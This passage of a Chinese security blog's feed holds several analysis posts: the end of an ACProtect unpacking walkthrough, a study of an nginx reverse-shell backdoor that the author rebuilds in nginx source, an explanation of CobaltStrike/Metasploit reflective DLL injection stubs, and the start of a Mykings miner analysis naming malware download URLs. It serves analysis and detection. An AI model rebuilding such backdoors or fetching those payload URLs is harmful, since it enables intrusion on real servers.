src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image012.jpg"></p><p>于是现在就面临着这样两个问题，一个是存在stolen code，另一个是IAT被加密保护了。</p><p>当然是选择迎男而上了，不对，是迎难而上。</p><h2 id="Stolen-code"><a href="#Stolen-code" class="headerlink" title="Stolen code"></a>Stolen code</h2><p>首先来看一看stolencode，不过之前从没有搞过，怎么入手呢？这个时候前人的研究就显得额外的有意义了。论坛一搜，一大堆关于ACProtect相关的资料。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image014.jpg"></p><p>在这些众多的资料，找到了几份关于stolencode的，其中以wynney大佬针对ACProtect1.09版本的精华帖为例子。<a href="https://bbs.pediy.com/thread-30330.htm">https://bbs.pediy.com/thread-30330.htm</a></p><p>其中使用了两种技术，一种是利用了CreateToolhelp32SnapshotAPI来进行反调试，另外一种是利用异常来实现。经过测试后，感觉利用异常来更稳定，可以符合ACProtect的多个版本。</p><p>首先设置od的异常属性，除了int3以外的，其他全选。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image015.png"></p><p>首先程序入口点典型的可以esp定律。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image017.jpg"></p><p>单步执行之后，这里为了好操作，在下方命令栏输入hr esp。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image019.jpg"></p><p>将程序运行起来，会中断在一个int3断点附近，这时注意栈上的数据，这里栈顶是SHE异常处理链的指针，SE句柄，就是异常处理函数。如果不知为什么的小伙伴可以去查一下异常处理相关联的东西就会明白啦。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image021.jpg"></p><p>通过SE句柄，定位到内存，设置内存访问断点。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image022.png"></p><p>同样的使用shift+f9，程序停留在这样的一个地方。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image024.jpg"></p><p>在当前位置设置f2断点，并shift+f9继续执行，中断在这样的地方。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image026.jpg"></p><p>继续在当前位置继续设置f2断点，同样shift+f9执行，停留在这个位置。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image027.jpg"></p><p>当f2断点执行后，会在od下方看到一个提示框，其中应该还有之前设置的内存断点的作用，其实我自己对这两个f2断点不是很理解为什么，是为了追溯到来源还是什么？这是我没弄明白的地方，知道为什么的兄弟，可以帮我提点我一下么~，感激不尽。</p><p>最后取消两个f2断点，清除掉内存断点。在retn处f4。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image029.jpg"></p><p>此时由于开始头部下了硬件断点，接下来运行后，就会停留在被抽取的代码位置处。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image031.jpg"></p><p>这时就可以dump文件了，不过这个时候的oep却不能写这个位置，否则找不到对应的IAT信息，但是如果是通过修补oep数据的方式会导致程序出问题，所以最好是在这里dump文件，然后手动修复IAT即可。</p><p>到这里基本上关于ACProtect的stolen code部分就算结束了。</p><h2 id="IAT加密处理"><a href="#IAT加密处理" class="headerlink" title="IAT加密处理"></a>IAT加密处理</h2><p>相比之前的stolen code，手动处理IAT加密才是真的难搞，其一有现成的importrec的修复插件，但是这插件怎么说呢，老容易卡死，就让我萌生了自己处理IAT的想法，其二是找了很久都没有找到相关IAT加密处理的资料。</p><p>通过google，终于还是找到了IAT加密处理的部分，不过这帖子是全英的，我看完之后还是有所感悟，终于还是通过各方面的调试成功破开了ACProtect的IAT加密部分。</p><p>修改od的调试选择，全部选择。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image033.jpg"></p><p>同样的还是先使用内存断点法进行rsrc段的解密，同时查看0x401000段，发现存在一些有意思的东西。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image035.jpg"></p><p>这应该就是IAT存储的位置了，随意选择一个，以0x4050d8为例子，设置内存写入断点，执行起来。(不要问我为什么不用硬件断点，我肯定用了啊，当然是没效果，不然我为什么用内存断点)</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image037.jpg"></p><p>这里就是IAT写入的关键点，经过多次调试发现，这部分代码还需要二次解密，如果这里下断点f2断点，之后是无法中断下来的，那么现在怎么办？通过我对acptotect1.09g、ACProtect1.32、ACProtect1.41以及ACProtect2.0四个版本的测试发现了一个通用的定位方法。</p><p>找到IAT写入关键点之后，往上找，找到第一次出现retn的地方，不要问我为什么，问就是不知道(bbll而已)。真不要问，我是自己测试出来的，就像被人给你一个特征码是一样的道理。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image039.jpg"></p><p>通过这个retn之后，单步缓慢执行，等待之后的代码解码。当你看到cmp eax和MessageBoxA做比较的时候，那么恭喜你，你已经找到了IAT加密的部分了，修改掉je跳转为jmp，不过这个地址可能需要做更改，具体该不该，看之后跳转的地址是不是lea eax开始，如果不是则不需要修改je的跳转地址，如果是则需要修改地址为lea eax地址下一条指令的地址。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image041.jpg"></p><p>接下来的je就是整个IAT的magic jmp了，处理掉这个je，所有的IAT就不会被加密了，特征就是通过cmp [ebp+address],0。不确定的话，可以看下是否是跳转到mov dword ptr ds:[edi],eax。如果是就表示这就是magic jmp跳转。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image043.jpg"></p><p>这个时候，就可以放任程序跑起来了，毕竟我只是要一个完整的IAT信息而已。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E5%A3%B3%E4%B9%8BACProtect%E7%B3%BB%E5%88%97%E9%80%9A%E6%9D%80/clip_image045.jpg"></p><p>ok，全部有效，修复下文件，完美~。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>作为曾经对新手极具杀伤力壳，现如今却成为了练手的基本功，脱壳与加壳就如同加密与解密，彼此相辅相成，亦或是盾与矛的关系。从ACProtect中也学到了一些关于脱壳的心得，也是略有所成吧。有缘我们下次还会再见面。</p><p>ACProtect各个加壳版本的程序，我已经打包发布在看雪平台上了，大家有兴趣研究的可自行下载，链接<a href="https://bbs.pediy.com/thread-261702.htm%E3%80%82">https://bbs.pediy.com/thread-261702.htm。</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;原文章发布于看雪论坛和安全分析与研究公众号，现将文章整理进个人blog。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;在经过几天的研究和</summary>
      
    
    
    
    <category term="加壳脱壳" scheme="http://risks255.github.io/categories/%E5%8A%A0%E5%A3%B3%E8%84%B1%E5%A3%B3/"/>
    
    
    <category term="ACProtect" scheme="http://risks255.github.io/tags/ACProtect/"/>
    
  </entry>
  
  <entry>
    <title>某Nginx后门分析与复现</title>
    <link href="http://risks255.github.io/2020/07/27/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://risks255.github.io/2020/07/27/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-07-27T02:51:00.000Z</published>
    <updated>2021-02-03T11:50:02.275Z</updated>
    
    <content type="html"><![CDATA[<p><strong>原文章发布于看雪论坛和安全分析与研究公众号，现将文章整理进个人blog。</strong></p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>前几天，接到一个nginx后门样本，本着就分析和复现的思路，完整的将整个过程做一次复现，不料最终还获取到了后门的核心代码部分，遂将其整理发布。</p><p>在后续分析之前先来了解下nginx后门的功能。通过在Cookie中包含特征字符串lkfakjfa，并填写需要反弹的ip和端口，完成shell反弹，这就是后门的一个大致情况。</p><h2 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h2><p>MD5: ab498686505dfc645e14c6edad280da7</p><p>VT中可直接下来，前几日还是0查杀，目前只有tencent可以查杀。</p><h2 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h2><p>在已有的分析情报的帮助下，得知nginx后门位于ngx_http_header_filter，IDA装载样本，发现样本带有符号信息。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image001.png"></p><p>找到ngx_http_header_filter函数，找到了关键字符串lkfakjf。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image002.png"></p><p>F5之后，发现之后调用了一个connect_shell的函数。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image004.jpg"></p><p>通过对connect_shell进行分析发现，是一个反弹shell的功能，利用socket编程完成shell反弹。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image005.png"></p><h2 id="后门复现"><a href="#后门复现" class="headerlink" title="后门复现"></a>后门复现</h2><p>首先启动后门nginx文件，由于nginx会绑定80端口，如果多次启动会提示80端口被占用而无法启动。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image006.png" alt="http://irs.nsfocus.com/irs/nis/picture/6960"></p><p>接着进行本地监听9999</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image007.png" alt="http://irs.nsfocus.com/irs/nis/picture/6961"></p><p>使用curl来触发漏洞。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image008.png" alt="http://irs.nsfocus.com/irs/nis/picture/6962"></p><p>此时nc里已经得到了shell</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image009.png" alt="http://irs.nsfocus.com/irs/nis/picture/6963"></p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image010.png" alt="http://irs.nsfocus.com/irs/nis/picture/6964"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>通过gdb调试和IDA分析发现，要判断cookies中是否存在特征字符串lkfakjf，用到了一个这样的结构体ngx_http_request_t。</p><p>使用source insight打开nginx源码，定位到ngx_http_header_filter，发现参数就是ngx_http_request_t，查看该结构体的情况。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image011.png"></p><p>该结构体相对比较大，这里截图只留下要使用的部分header_in；</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image012.png"></p><p>通过header_in的结构继续寻找，找到cookies的定义。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image013.png"></p><p>最后找到关于cookies的结构体情况。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image014.png"></p><p>结合IDA中代码分析，v4就是cookies结构体，通过结构体偏移+32字节定位到输入的特征字符串，在这里我也没有分析的特别清楚，初步判断应该是ngx_pool_t结构体。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image015.png"></p><h2 id="重现后门"><a href="#重现后门" class="headerlink" title="重现后门"></a>重现后门</h2><p>首先，我们要先获取cookies的结构，通过r-&gt;headers_in.cookies.elts即可获得。</p><p>然后取到void *elts的内容，最后通过32字节偏移得到存储输入特征码的地址，取其值即可拿到输入的特征字符串的值，最后的代码形式如下图。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image016.png"></p><p>对这代码做个解释，首先v1和v2是long *的指针。</p><p>第一句代码(long *)r-&gt;headers_in.cookies.elts；将void *的elts指针转化为long *的指针。</p><p>第二句代码v2=(long <em>)*v1;*v1是取其值，在将其值转化为long</em>的指针。</p><p>第三句代码cookie =(char <em>)</em>(v2+4);v2+4是表示在v2的基础上，偏移4个long*个字节，如果你的v2定义为char <em>这里就是v2+32；</em>(v2+4)取该偏移的内容，最后转化为char *的指针。</p><p><strong>以上代码只适用于64位linux，以上代码只适用于64位linux，以上代码只适用于64位linux，重要的事情说三遍。</strong></p><p>使用nginx的configure配置，只需要配置–prefix=/root/nginx即可，当configure运行完成后会生成Makefile文件。配置过程中，可能缺少很多的依赖，逐个安装即可。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image017.png"></p><p>然后修改位于objs里的Makefile文件，修改为如下配置，否则编译会报错。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image018.png"></p><p>此时使用make编译，等待编译完成。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image019.png"></p><p>make install安装一下，安装的位置为之前配置的prefix路径。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image021.jpg"></p><p>运行和调试nginx文件，能够成功获取输入的特征字符串。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image023.png" alt="http://irs.nsfocus.com/irs/nis/picture/6968"></p><p>其中rsi为触发漏洞的输入，rdi为内置特征字符串，这里选择了printf打印，能够成功获取到输入的特征字符串。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image025.png" alt="http://irs.nsfocus.com/irs/nis/picture/6969"></p><p>接下来准备复现反弹shell，添加功能代码，代码只能适用于带有nc命令的系统，编译后进行复现操作。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image026.png"></p><p>现在的特征字符串被修改为123456，现在来触发该后门。</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image027.png"></p><p>成功接收到反弹的shell</p><p><img src="/img/%E6%9F%90Nginx%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/clip_image028.png"></p><p>自此后门重现成功，整个分析和复现过程到此结束。</p><h2 id="后门排查"><a href="#后门排查" class="headerlink" title="后门排查"></a>后门排查</h2><p>目前后门排查只能针对特定的版本，如果出现新nginx后门，排查手段大概率会失效。</p><p>1．本地验证 通过grep命令判断当前运行对nginx里面是否存在”/bin/sh”可疑字符串</p><p>$ which nginx |xargs grep “/bin/sh” –la</p><p>2．将nginx文件提取出来，使用IDA分析查找ngx_http_header_filter，下载nginx源码和IDA F5做对比判断是否存在后门。</p><p>最好的效果是下载nginx对应的源码对比是否有增加或改动的地方，但是这份方法比较耗时耗力，但是效果比较好。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;原文章发布于看雪论坛和安全分析与研究公众号，现将文章整理进个人blog。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;前几天，接到一个n</summary>
      
    
    
    
    <category term="Linux" scheme="http://risks255.github.io/categories/Linux/"/>
    
    
    <category term="Nginx后门" scheme="http://risks255.github.io/tags/Nginx%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>反射注入案例</title>
    <link href="http://risks255.github.io/2020/07/13/%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    <id>http://risks255.github.io/2020/07/13/%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/</id>
    <published>2020-07-13T03:41:00.000Z</published>
    <updated>2021-02-03T11:47:48.262Z</updated>
    
    <content type="html"><![CDATA[<p><strong>原文章发布于看雪论坛和安全分析与研究公众号，现将文章整理进个人blog。</strong></p><p>上周看了大佬些发的反射DLL注入的文章，对我很有启发，让我想起了前段时间遇到的基于反射DLL注入的一些应用，小弟不才，如果有什么问题，还请各位大佬指点一二。</p><h2 id="分享背景"><a href="#分享背景" class="headerlink" title="分享背景"></a>分享背景</h2><p>这个基于反射DLL注入应用的样本来源于红蓝对抗，当时分析时觉得这技术挺有意思的，但是没有做过多的记录。看了大佬发的反射DLL注入，遂有了这篇文章的诞生。</p><h2 id="技术应用"><a href="#技术应用" class="headerlink" title="技术应用"></a>技术应用</h2><p>对于反射DLL注入应用其实已经有很多了，但是最大的应该还是要归功于CobaltStrike和Metasploit两大著名的利用工具。CobaltStrike和Metasploit在渗透方面能力突出，堪比神器也不为过。<strong>今天分享的应用便是来源于CobaltStrike生成的后门。而这后门则是利用了反射DLL注入技术，从而实现DLL文件的不落地，不仅如此，这里面还用到了Dos头部分的空间，来实现定位反射DLL注入函数，最后通过DLLMain执行相关后门操作。</strong></p><h2 id="技术解析"><a href="#技术解析" class="headerlink" title="技术解析"></a>技术解析</h2><p>接下来我们来看一看到底有什么不一样呢</p><p>首先是基于反射DLL注入技术并修改了Dos头信息的情况。</p><p><img src="/img/%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/clip_image002.jpg"></p><p>接下来看看正常的Dos头情况。</p><p><img src="/img/%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/clip_image004.jpg"></p><p>可以明显的发现Dos头信息完全不一样，就是因为这样的修改，可以让加载到内存的exe从Dos头开始执行，并且能够正常的完成反射式的加载过程。</p><p>接下来我们来看看被标记为beacon.dll的情况，使用ida加载后可以看到有一个名为ReflectiveLoader(x)的导出函数，这个函数就是执行反射式DLL的功能，修改Dos头的目的也是为了去执行ReflectiveLoader(x)导出函数。</p><p><img src="/img/%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/clip_image005.png"></p><p>接下来我们来解析一下为什么那段代码可以成功的调用ReflectiveLoader(x)导出函数。</p><p>首先的dec ebp 和pop edx 是16进制4D和5A对应的汇编代码，并没有什么特殊的含义。</p><p>接下来的E8 00000000 其中的00000000表示机器码的内容。</p><p>这里就要介绍一下关于call后地址如何计算的问题了，一个最简单的办法就是记得这个计算公式。</p><p>机器码内容=当前地址-目标地址+5；</p><p>当前地址=3c0002，所以目的地址=机器码内容-当初地址+5=3c0007；</p><p>所以call的地址为call 3c0007；</p><p>pop ebx 给ebx赋值为3c0007也就是当前esp的值</p><p>mov edi,ebx 将ebx赋值给edi</p><p>push edx 将edx入栈</p><p>inc ebp 恢复之前dec ebp的值</p><p><img src="/img/%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/clip_image006.png"></p><p>这几步操作可谓是精妙。</p><p>push ebp</p><p>mov ebp,esp</p><p>add ebx,0x8150 构造与ReflectiveLoader(x)函数的偏移量</p><p>call ebx 执行ReflectiveLoader(x)函数</p><p><img src="/img/%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/clip_image007.png"></p><p>并且ReflectiveLoader(x)函数返回了DLLMain的地址。</p><p>接下来就是调用DLLMain函数了，构造DLLMain的三个参数。</p><p>push 0x0</p><p>push 0x4</p><p>push 0</p><p>call eax</p><p>其中第一个参数和第三个参数无关紧要，可以设置为0，但是第二个参数就相对比较重要了，表示了DLL调用的fdwReason，也就是关乎在DLL中进入到哪个功能执行。</p><p>这里举一个开发的例子，如下图所示。表示了DLL的调用原因。</p><p><img src="/img/%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/clip_image009.jpg"></p><p>这里的ATTACH为我自定义的值，也可以使用原始的的值</p><p><img src="/img/%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/clip_image010.png"></p><p>自此Dos头修改的代码就基本解答完成，这么精妙的代码，我肯定是写不出来的，我做的不过是一个搬运工的操作。这段代码来源是Metasploit的核心功能。</p><p><img src="/img/%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/clip_image012.jpg"></p><p>相关Github地址 <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reflectivedllinject.rb">rapid7</a></p><h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><p>接下来以Metasploit的reverse_tcp来看一看整个反射DLL的传输情况。</p><p>这段代码是标准的reverse_tcp原始代码，不经过任何加工的产物。</p><p><img src="/img/%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/clip_image014.jpg"></p><p>这里调用VirtualAlloc为要传输的exe分配内存空间。</p><p><img src="/img/%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/clip_image016.jpg"></p><p>这里的jnz是来判断当前文件是否传输完毕，最后通过ret指令返回到分配地址头部。</p><p><img src="/img/%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/clip_image017.png"></p><p>可以看到Dos头部有明显的改动，这就是Metasploit内置的reflectivedllinject.rb完成的相关功能。</p><p><img src="/img/%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/clip_image018.png"></p><p>当整个payload运行起来之后，我们来看一下Metasploit端的情况。</p><p>这里发送的957487字节就是刚才被修改过的Dos头的DLL文件。</p><p><img src="/img/%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/clip_image020.jpg"></p><p>除了Metasploit，CobaltStrike也经常使用这种方式来完成无文件执行。</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>自此，本次分享就到此结束了，各位大佬有问题，可以留言告知我。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;原文章发布于看雪论坛和安全分析与研究公众号，现将文章整理进个人blog。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;上周看了大佬些发的反射DLL注入的文章，对我很有启发，让我想起了前段时间遇到的基于反射DLL注入的一些应用，小弟不才，如果有什么问题，还请各位大佬指点一</summary>
      
    
    
    
    <category term="进程相关技术" scheme="http://risks255.github.io/categories/%E8%BF%9B%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="反射注入" scheme="http://risks255.github.io/tags/%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Mykings挖矿</title>
    <link href="http://risks255.github.io/2020/07/10/Mykings%E6%8C%96%E7%9F%BF/"/>
    <id>http://risks255.github.io/2020/07/10/Mykings%E6%8C%96%E7%9F%BF/</id>
    <published>2020-07-10T07:35:00.000Z</published>
    <updated>2021-02-03T11:46:57.753Z</updated>
    
    <content type="html"><![CDATA[<p><strong>原文章发布于看雪论坛和安全分析与研究公众号，现将文章整理进个人blog。</strong></p><h2 id="背景说明"><a href="#背景说明" class="headerlink" title="背景说明"></a>背景说明</h2><p>​    一张图引发的关于信息收集和搜索的思考问题。要是以前的我，估计就会不了了之了，不过现在有所不同了，任何东西都要讲究细节，今天就来细节细节。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image002.jpg"></p><h2 id="29日数据收集和整理"><a href="#29日数据收集和整理" class="headerlink" title="29日数据收集和整理"></a>29日数据收集和整理</h2><p>由客户提供的一张带有某域名的图片开始了我本次的分享内容，原始图片如下所示。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image002.jpg"></p><p>经访问发现js.1226bye.xyz:280/v.sct居然还存活，这一点让我非常惊讶。通过js.1226bye.xyz:280/v.sct拿回来一些信息，如下图所所示。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image004.jpg"></p><p>其中ups.dat是通过js.1226bye.xyz:280得v.sct脚本内容获取。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image006.jpg"></p><p>紧接着ups.dat 自启动的压缩文件，用于释放内部文件，文件内容如图所示。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image007.png"></p><p>同样的upx.exe也是采用了同样的方法存储了内部的文件，文件内容如图所示。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image009.jpg"></p><p>接下来要分别看一看n.vbs和c3.bat了。</p><p>n.vbs内容相对简单，就是启动位于%temp%目录下的c3.bat</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image010.png"></p><p>c3.bat就有所不同了，是一个内容非常复杂的处理脚本。从内容上看像一个清理脚本。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image012.jpg"></p><p>同时有创建计划任务，名为Mysa和Mysa2等</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image014.jpg"></p><p>以及清理相关计划任务的操作。</p><p><img src="/img/Mykings%E6%8C%96%E7%9F%BF/clip_image016.jpg"></p><p>通过设置自启动来启动后门，下载位于<a href="http://js.mys2016.info:280/v1.sct%E7%9A%84%E8%84%9A%E6%9C%AC%E5%86%85%E5%AE%B9%E3%80%82">http://js.mys2016.info:280/v1.sct的脚本内容。</a></p><p><img 